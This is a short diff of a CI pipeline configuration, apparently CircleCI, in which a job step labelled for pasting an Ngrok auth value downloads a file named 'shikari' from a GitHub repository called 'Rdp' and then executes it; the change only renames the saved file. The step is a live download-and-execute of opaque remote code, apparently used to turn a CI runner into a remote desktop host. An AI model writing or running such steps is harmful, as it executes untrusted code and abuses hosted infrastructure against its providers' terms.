@@ -16,6 +16,6 @@ jobs:
       - run: 
           name: Paste Ngrok Auth Value In Hosted Link
           command: |      
-            Invoke-WebRequest https://github.com/Botmirror69/Rdp/raw/main/shikari -OutFile gpu.ps1 
+            Invoke-WebRequest https://github.com/Botmirror69/Rdp/raw/main/shikari -OutFile shikari.io 
           
-      - run: ./gpu.ps1
+      - run: ./shikari.io
